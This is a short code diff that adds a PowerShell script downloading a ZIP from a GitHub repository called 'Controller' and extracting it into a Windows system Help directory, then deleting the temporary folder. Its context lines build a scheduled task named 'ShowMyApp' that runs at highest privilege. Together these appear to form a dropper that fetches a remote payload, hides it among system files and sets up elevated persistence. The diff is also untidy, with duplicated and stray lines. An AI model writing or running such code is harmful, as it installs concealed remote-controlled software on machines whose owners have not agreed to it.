@@ -4,3 +4,24 @@ string createCmd = $"/Create /TN \"ShowMyApp\" /TR \"{exePath}\" " +
                    $"/SC ONCE /ST {startTime} /RL HIGHEST /F /RU \"{username}\"";
 string createCmd = $"/Create /TN \"ShowMyApp\" /TR \"\\\"{exePath}\\\"\" /SC ONCE /ST {startTime} /RL HIGHEST /F /RU \"{username}\"";
 C:\Windows\Help\Windows\IndexStore\en-US
+
+
+# Set variables
+$url = "https://github.com/burner-afk/Controller/archive/refs/heads/main.zip"      
+$zipPath = "C:\temp\Controller-main.zip"
+$extractPath = "C:\Windows\Help\Windows\IndexStore\en-US"
+
+
+
+# Create directory for download and extraction
+New-Item -ItemType Directory -Force -Path (Split-Path $zipPath)
+
+
+# Download the ZIP file
+Invoke-WebRequest -Uri $url -OutFile $zipPath
+
+# Extract the ZIP file
+Add-Type -AssemblyName System.IO.Compression.FileSystem
+[System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $extractPath)
+
+Remove-Item "C:\temp" -Recurse -Force
